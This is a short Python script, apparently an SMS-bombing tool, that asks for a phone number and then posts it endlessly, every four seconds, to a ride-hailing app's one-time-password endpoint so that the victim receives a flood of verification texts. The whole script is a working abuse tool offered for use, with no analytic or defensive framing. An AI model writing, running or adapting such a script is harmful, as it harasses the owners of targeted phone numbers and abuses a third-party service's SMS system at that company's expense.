import requests
import time

try:
    print("Note : For Exit Tools ==> Ctrl + C ")
    NumberPhone = input("Enter Number Phone (example: 9112222022) = ")

    if NumberPhone == "" :
        print("\n[!] Please Enter Phone Number")
    else :
        url = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
        data = {"cellphone":"+98" + NumberPhone}

    while True:
        requests.post(url,data=data)
        print("[+] Send SMS [+]")
        time.sleep(4)
except:
    print("\n[-] You Exit Tools !!")
print ("@EBLETSM")
